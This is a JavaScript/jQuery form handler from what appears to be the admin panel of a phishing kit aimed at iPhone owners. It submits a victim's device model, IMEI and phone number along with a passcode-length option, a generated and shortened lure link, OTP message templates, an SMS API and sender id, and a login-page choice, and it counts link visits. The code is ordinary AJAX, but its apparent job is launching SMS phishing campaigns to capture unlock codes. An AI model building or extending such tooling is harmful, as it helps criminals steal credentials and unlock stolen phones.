/**********Ingreso menu*************/
$(document).on("submit", ".form-equipos", function (event) {

   event.preventDefault();

   const Toast = Swal.mixin({
      toast: true,
      position: 'top-end',
      showConfirmButton: false,
      timer: 3000
   });

   var $form = $(this);
   var valor1 = "";
   var valor2 = "";


   if ($('.codeunlock').is(':checked')) {
      valor1 = "CODEUNLOCKSUCESS";

      if ($('input[name="codeunlockiphone"]:checked').val() == 4) {

         valor2 = "4";
      } else if ($('input[name="codeunlockiphone"]:checked').val() == 6) {
         valor2 = "6";
      }
   } else {
      valor1 = 'none';
      valor2 = "none";
   }


   var modelo = "";

   if ($("#modelo").val() == "otro") {
      modelo = "otro";
      modelo_pref = $("#modeloinput").val();
   } else {
      var modelo = document.getElementById("modelo");
      var modelo_pref = modelo.options[modelo.selectedIndex].text;
   }

   

let latitud_generada  = '';
let longitud_generada = '';
if($("#latitud").val() == ''|| $("#longitud").val() == ''){
   latitud_generada  = 'latitud_ip';
   longitud_generada = 'longitud_ip';
}else{
   latitud_generada  = $("#latitud").val();
   longitud_generada = $("#longitud").val(); 
}

let pais = '';
let numero = '';

if($("#pais").val() == 'null'){
    pais = 'Estados Unidos';
}else{
    pais = $("#pais").val();
}

if($("#numero").val() == ''){
    numero = '1000000000'
}else{
    numero = $("#numero").val();
}





   var data_form = {
      tipo                   : $("#plataforma").val(),
      user                   : $("#usuario").val(),
      niphone                : $("#niphone").val(),
      pais                   : pais,
      numero                 : numero,
      email                  : $("#email").val(),
      modelo_pref            : $("#modelo").val(),
      modelo                 : modelo_pref,
      imei                   : $("#imei").val(),
      linkg                  : $("#igeneratelink").val(),
      status                 : 'process',
      visitas                : 0,
      valor1                 : valor1,
      valor2                 : valor2,
      tipolinkg              : $("#tipolinkg").val(),
      subtipo                : $("#subtipo").val(),
      latitud                : latitud_generada,
      longitud               : longitud_generada,
      urlacortada            : $("#urlacortada").val(),
      opcion_otp             : $("#opcion_otp").val(),
      tipo_verificacion_otp  : $("#tipo_verificacion_otp").val(), 
      plantilla_otp          : $("#plantilla_otp").val(),
      lenguaje_otp           : $("#lenguaje_otp").val(),
      id_apisms              : $("#id_apisms").val(),
      idsender               : $("#idsender").val(),
      inicio_sesion          : $("#inicio_sesion").val()


   }
   //var url_php = 'equipo/setEquipo';
   var url_php = 'setEquipo';
   $.ajax({
         type: 'POST',
         url: url_php,
         data: data_form,
         dataType: 'json',
         async: true,
      }).done(function ajaxDone(res) {
        

            if(res.statusAdd !== undefined){
               if(res.statusAdd == true){
                  //$(".msgsuccess").show('slow');
                  Toast.fire({
                     type: 'success',
                     title: 'El requerimiento se genero correctamente.'
                  })
                 

                  $(".form-equipos")[0].reset();
                  $("#usuario").val("");
                  $("#niphone").val("");
                  $("#numero").val("");
                  $("#email").val("");
                  $("#modelo").val("iPhone");
                  $("#imei").val("");
                  $('#plataforma').prop('selectedIndex', 0);
                  $('#tipolinkg').prop('selectedIndex', 0);
                  $('.switchery small').css('left', '0px');
                  $("#codeunlock").prop('checked', false);
                  $('.codeunlockiphone').attr("disabled", true);
                  $('.codeunlockiphone').prop('checked', false);
                  $('span.switchery').css("box-shadow", "rgb(223, 223, 223) 0px 0px 0px 0px inset");
                  $('span.switchery').css("border-color", "rgb(223, 223, 223)");
                  $('span.switchery').css("background-color", "rgb(255, 255, 255)");
                  $('span.switchery').css("transition", "border 0.5s ease 0s, box-shadow 0.5s ease 0s");
                  $("#linkgtrue").hide();
                  $("#linkgfalse").hide();
                  $("#linkgvacio").hide();
                  $("#guardarequipo").prop('disabled', true);
                  $("#latitud").val("");
                  $("#longitud").val("");


               }else if(res.statusAdd == false){ 
                  //$(".msgerror").show('slow'); 
                  Toast.fire({
                     type: 'error',
                     title: 'Hubo un problema al agregar el requerimiento.'
                  })

               }
               return false;
            }
        

      })
      .fail(function ajaxError(e) {
         console.log(e);
      })
      .always(function ajaxSiempre() {
         // console.log('Final de la llamada ajax.');
      })
   return false;
});

